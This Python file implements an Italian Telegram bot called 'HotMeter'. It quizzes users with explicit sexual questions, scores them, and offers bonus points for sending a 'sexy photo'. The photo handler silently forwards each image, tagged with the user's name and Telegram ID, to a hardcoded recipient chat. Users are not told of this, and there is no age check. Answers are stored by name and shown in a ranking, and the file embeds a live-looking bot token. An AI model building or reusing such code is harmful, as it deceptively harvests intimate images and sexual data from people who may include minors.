from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telegram import BotCommand
import json
import datetime
import asyncio

TOKEN = "8178461879:AAGv-fjgLd3pLWXd7D1n-eAa7kfM9tMrGGw"
ID_DESTINAZIONE_FOTO = 7716480349
FILE_GIOCATORI = "giocatori.json"

# Domande con risposte personalizzate
domande = [
    {
        "testo": "Hai mai fatto sesso con più di una persona?",
        "risposte": [
            ("No, mai", 1),
            ("No, ma vorrei provarlo", 2),
            ("Si, una volta", 3),
            ("Si, più volte", 4)
        ]
    },
    {
        "testo": "Hai mai fatto sesso in acqua (mare, piscina, doccia)?",
        "risposte": [
            ("Non lo ho mai fatto", 1),
            ("Ho solo provato", 2),
            ("Mi è capitato più di una volta", 3),
            ("Amo il sesso in acqua, lo farei sempre li", 4)
        ]
    },
    {
        "testo": "Guardi contenuti porno?",
        "risposte": [
            ("Mai visti", 1),
            ("Mi è capitato di guarderne qualcuno", 2),
            ("Si li guardo", 3),
            ("Praticamente ogni giorno", 4)
        ]
    },
    {
        "testo": "A quanto ammonta il tuo bodycount?",
        "risposte": [
            ("Da 1 a 3", 1),
            ("Da 4 a 6", 2),
            ("Da 7 a 9", 3),
            ("Oltre 1 10", 4)
        ]
    },
    {
        "testo": "Hai mai fatto videochat erotiche?",
        "risposte": [
            ("No, mai", 1),
            ("Solo una volta per curiosità", 2),
            ("Si, quanto sono lontan* dal partner", 3),
            ("Si, mi eccita molto", 4)
        ]
    },
    {
        "testo": "Hai mai filmato o registrato un tuo rapporto sessuale?",
        "risposte": [
            ("No, mai", 1),
            ("Solo audio o qualche foto", 2),
            ("Si, ma solo una volta", 3),
            ("Si, mi eccita guardarmi", 4)
        ]
    },
    {
        "testo": "Sperimenteresti esprienze con il tuo stesso sesso?",
        "risposte": [
            ("No, non mi attira per niente", 1),
            ("Forse, in certe situazioni lo farei", 2),
            ("Si, la curiostià c'è", 3),
            ("Si, l'ho già fatto", 4)
        ]
    },
    {
        "testo": "Hai mai fatto sesso in un luogo pubblico o in una situazione rischiosa?",
        "risposte": [
            ("No, mi piace la tranquillità", 1),
            ("Solo in auto o posti appartati", 2),
            ("Si, in luoghi dove potevano scoprirci", 3),
            ("Si, io cerco l'adrenalina", 4)
        ]
    },
    {
        "testo": "Hai mai provato a masturbarti con oggetti non pensati per il sesso (spazzola, manico, frutta, ecc.)?",
        "risposte": [
            ("No, mai", 1),
            ("Ci ho pensato ma non l'ho fatto", 2),
            ("Si, ho provato", 3),
            ("Amo provare cose nuove o originali", 4)
        ]
    },
    {
        "testo": "Hai mai fatto sesso con un ex dopo la rottura?",
        "risposte": [
            ("Non lo farei mai", 1),
            ("Ci ho pensato ma ho resistito", 2),
            ("Si, una volta per capire se provassi ancora qualcosa", 3),
            ("Si, più volte", 4)
        ]
    },
    {
        "testo": "Hai mai fatto sesso anale (dato o ricevuto)?",
        "risposte": [
            ("No, mai", 1),
            ("Si, una volta", 2),
            ("Qualche volta", 3),
            ("Si, regolarmente", 4)
        ]
    },
    {
        "testo": "Hai mai fatto sesso senza sapere il nome dell’altra persona?",
        "risposte": [
            ("Mai, voglio sapere con chi lo faccio!", 1),
            ("Si, ma è capitato solo una volta", 2),
            ("Ogni tanto succede", 3),
            ("Spesso, non mi interessa sapere il nome", 4)
        ]
    },
    {
        "testo": "Ti è mai capitato di farti toccare o di toccare qualcuno in un locale (discoteca, bar, ecc.)?",
        "risposte": [
            ("Mai", 1),
            ("Solo qualche toccatina", 2),
            ("Si, è successo", 3),
            ("Si e quando sucede lo adoro", 4)
        ]
    },
    {
        "testo": "Hai mai fantasticato su una persona mentre facevi sesso con un’altra?",
        "risposte": [
            ("No, mai", 1),
            ("Mi è successo una sola volta", 2),
            ("Ogni tanto capita", 3),
            ("Si, mi capita quando non faccio sesso con chi vorrei", 4)
        ]
    },
    {
        "testo": "Hai mai fatto sesso con qualcuno molto più giovane o più grande di te?",
        "risposte": [
            ("No, al massimo 2 o 3 anni di differenza", 1),
            ("Trai 3 e i 6 anni di differenza", 2),
            ("Tra i 6 e i 10 anni di differenza", 3),
            ("Si, oltre i 10 anni di differenza", 4)
        ]
    },
    {
        "testo": "Quante volte ti masturbi in un settimana?",
        "risposte": [
            ("Non mi masturbo", 1),
            ("Qualche volta", 2),
            ("Ogni giorno", 3),
            ("Ogni giorno e più volte al giorno", 4)
        ]
    },
    {
        "testo": "Cosa pensi del sesso orale?",
        "risposte": [
            ("Non fa per me, lo evito", 1),
            ("Lo faccio solo se me lo chiedono", 2),
            ("Mi piace, mi eccita", 3),
            ("Lo amo, è una delle mie pratiche preferite", 4)
        ]
    },
    {
        "testo": "Hai mai mandato messaggi hot mentre chi doveva riceverlo era in un contesto impegnato (es. lavoro, cena in famiglia, scuola)?",
        "risposte": [
            ("No, mai", 1),
            ("Una volta sola", 2),
            ("Si, a volte lo faccio", 3),
            ("Si, amo provocare nei momenti inopportuni", 4)
        ]
    },
    {
        "testo": "Hai mai inviato o ricevuto foto/spinte nude o sexy?",
        "risposte": [
            ("No, mai", 1),
            ("Solo al partner", 2),
            ("Si, qualche volta", 3),
            ("Si, mi diverte eccitare", 4)
        ]
    },
    {
        "testo": "Quante volte fai sesso in una settimana?",
        "risposte": [
            ("Non lo faccio", 1),
            ("Una o due volte", 2),
            ("Tre o quattro volte", 3),
            ("Quattro o più volte", 4)
        ]
    }
]

utenti = {}

def carica_dati():
    try:
        with open(FILE_GIOCATORI, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def salva_dati(dati):
    with open(FILE_GIOCATORI, "w", encoding="utf-8") as f:
        json.dump(dati, f, indent=4, ensure_ascii=False)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    utenti[user_id] = {"fase": "nome"}
    await update.message.reply_text("👋 Benvenuto! Scrivi un nome con cui vuoi partecipare (verrà usato nel ranking):")

async def imposta_comandi(app):
    comandi = [
        BotCommand("start", "Inizia il quiz HotMeter 🔥"),
        BotCommand("reset", "Ricomincia il test"),
        BotCommand("ranking", "Guarda la classifica")
    ]
    await app.bot.set_my_commands(comandi)

async def gestisci_messaggio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in utenti:
        await update.message.reply_text("Scrivi /start per iniziare.")
        return

    fase = utenti[user_id]["fase"]

    if fase == "nome":
        if len(text) < 3:
            await update.message.reply_text("❌ Il nome deve essere di almeno 3 caratteri.")
            return
        utenti[user_id]["nome"] = text
        utenti[user_id]["punteggio"] = 0
        utenti[user_id]["indice"] = 0
        utenti[user_id]["fase"] = "domande"
        utenti[user_id]["risposte"] = []
        await manda_domanda(update, context)

async def manda_domanda(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    dati = utenti[user_id]
    idx = dati["indice"]

    if idx >= len(domande):
        utenti[user_id]["fase"] = "attesa_scelta_foto"
        tastiera = InlineKeyboardMarkup([
            [InlineKeyboardButton("Sì 🔥", callback_data="vuoi_foto_si")],
            [InlineKeyboardButton("No 😇", callback_data="vuoi_foto_no")]
        ])
        await context.bot.send_message(
            chat_id=user_id,
            text="😏 Vuoi inviarmi una *foto sexy* per avere un *punteggio extra*? Più è hot, più punti ottieni.",
            parse_mode="Markdown",
            reply_markup=tastiera
        )
        return

    domanda = domande[idx]
    testo = domanda["testo"]
    bottoni = [
        [InlineKeyboardButton(txt, callback_data=f"risposta_{punti}_{txt}")]
        for txt, punti in domanda["risposte"]
    ]
    tastiera = InlineKeyboardMarkup(bottoni)
    await context.bot.send_message(
    chat_id=user_id,
    text=f"*Domanda {idx + 1}/{len(domande)}:*\n{testo}",
    reply_markup=tastiera,
    parse_mode="Markdown"
    )


async def gestisci_risposta(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if user_id not in utenti:
        return

    data = query.data

    if data.startswith("risposta_"):
        _, punti, risposta = data.split("_", 2)
        punti = int(punti)
        utenti[user_id]["punteggio"] += punti
        utenti[user_id]["risposte"].append({
            "domanda": domande[utenti[user_id]["indice"]]["testo"],
            "risposta": risposta,
            "punti": punti
        })
        utenti[user_id]["indice"] += 1
        await manda_domanda(update, context)

    elif data == "vuoi_foto_si":
        utenti[user_id]["fase"] = "foto"
        await query.message.reply_text("📸 Inviami la tua foto sexy ora!")

    elif data == "vuoi_foto_no":
        await mostra_punteggio_finale(user_id, context)
        print(f"[DEBUG] Utente {user_id} ha scelto di NON inviare foto. Procedo con punteggio finale.")

def calcola_livello(punti):
    if punti < 20:
        return "👼 Angelico", "Sei puro come la neve... o sei ancora vergine? 😇"
    elif punti < 30:
        return "😇 Innocente", "Curios* ma ancora nel mondo dei sogni. Ti stai riscaldando!"
    elif punti < 40:
        return "😉 Malizios*", "Hai pensieri piccanti... ma ancora pochi fatti. C'è speranza!"
    elif punti < 50:
        return "🔥 Provocat*", "Cominci ad esplorare i tuoi desideri... chi ti ferma più?"
    elif punti < 60:
        return "😏 Disinvolt*", "Non ti fai problemi... l’imbarazzo non fa parte del tuo vocabolario."
    elif punti < 70:
        return "🔞 Espert*", "Hai un curriculum erotico di tutto rispetto. Complimenti!"
    elif punti < 80:
        return "👠 Piccante Pro", "Sei un concentrato di fantasie, pronte a prendere vita. Il tuo cervello è NSFW."
    else:
        return "🥵 Leggendari*", "Tu non giochi... tu *sei* il gioco. Zozzeria al livello massimo 🔥"

async def mostra_punteggio_finale(user_id, context):
    punteggio = utenti[user_id]["punteggio"]
    nome = utenti[user_id]["nome"]
    livello, descrizione = calcola_livello(punteggio)

    print(f"[DEBUG] Calcolo punteggio finale per utente {user_id}")

    await context.bot.send_message(
    chat_id=user_id,
    text=f"😈 Hai totalizzato <b>{punteggio}</b> punti!\n\n<b>Livello:</b> {livello}\n<i>{descrizione}</i>",
    parse_mode="HTML"
    )


    print(f"[DEBUG] Inviato punteggio: {punteggio}")

    try:
        db = carica_dati()
        db[nome] = {
            "punteggio": punteggio,
            "timestamp": datetime.datetime.now().isoformat(),
            "risposte": utenti[user_id].get("risposte", [])
        }
        salva_dati(db)
    except Exception as e:
        print(f"[ERRORE SALVATAGGIO]: {e}")

    utenti[user_id]["fase"] = "fine"
    

async def ricevi_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in utenti:
        await update.message.reply_text("Scrivi /start per iniziare il test.")
        return

    dati = utenti[user_id]

    # Se ha già mandato una foto, evito di dare più punti
    if not dati.get("foto_inviata"):
        dati["punteggio"] += 10
        dati["foto_inviata"] = True

    nome = dati.get("nome", "Anonimo")
    foto_id = update.message.photo[-1].file_id

    try:
        await context.bot.send_photo(
            chat_id=ID_DESTINAZIONE_FOTO,
            photo=foto_id,
            caption=f"📸 Foto hot da *{nome}* (ID: {user_id})",
            parse_mode="Markdown"
        )
        print(f"[FOTO INVIATA] da {nome}")
    except Exception as e:
        print(f"[ERRORE INVIO FOTO]: {e}")
        await update.message.reply_text("⚠️ Errore nell'invio della foto bonus. Procedo comunque con la valutazione.")

    # Mostra il punteggio finale, solo se non già inviato
    if not dati.get("fase") == "fine":
        await mostra_punteggio_finale(user_id, context)

    dati["fase"] = "fine"

# /ranking
async def ranking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = carica_dati()
    now = datetime.datetime.now()
    risultati = []

    for nome, dati in db.items():
        t = datetime.datetime.fromisoformat(dati["timestamp"])
        if (now - t).days <= 7:
            risultati.append((nome, dati["punteggio"]))

    risultati.sort(key=lambda x: x[1], reverse=True)

    testo = "🏆 *Top Hotmeter - Ultimi 7 giorni:*\n\n"
    if risultati:
        for i, (nome, punti) in enumerate(risultati[:10], start=1):
            testo += f"{i}. {nome} — {punti} punti\n"
    else:
        testo += "Nessun partecipante recente."

    await update.message.reply_text(testo, parse_mode="Markdown")

async def reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in utenti:
        del utenti[user_id]
    await update.message.reply_text("🔄 Hai resettato il test. Scrivi /start per ricominciare.")

if __name__ == "__main__":
    import asyncio
    import nest_asyncio

    # Applico la patch per permettere più run nello stesso loop
    nest_asyncio.apply()

    async def main():
        app = ApplicationBuilder().token(TOKEN).build()

        await app.bot.set_my_commands([
            BotCommand("start", "Inizia il quiz HotMeter 🔥"),
            BotCommand("reset", "Ricomincia il test"),
            BotCommand("ranking", "Guarda la classifica")
        ])

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("ranking", ranking))
        app.add_handler(CommandHandler("reset", reset))
        app.add_handler(CallbackQueryHandler(gestisci_risposta))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, gestisci_messaggio))
        app.add_handler(MessageHandler(filters.PHOTO, ricevi_foto))

        print("🔥 HotMeterBot avviato...")
        await app.run_polling()

    asyncio.run(main())